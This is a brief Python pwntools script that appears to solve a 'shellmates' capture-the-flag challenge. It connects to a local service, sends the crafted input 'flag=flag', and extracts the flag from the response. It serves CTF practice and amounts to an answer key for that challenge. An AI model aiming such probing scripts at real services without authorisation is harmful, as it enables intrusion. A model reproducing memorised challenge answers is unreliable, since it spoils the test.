#!/usr/bin/env python3

from pwn import *

HOST, PORT = "localhost", 4000

if __name__ == "__main__":
    io = remote(HOST, PORT)

    payload = "flag=flag"
    io.sendlineafter("Input : ", payload)

    line = io.recvline().decode()
    flag = re.search(r"shellmates{.*?}", line).group(0)

    log.success(f"Flag : {flag}")
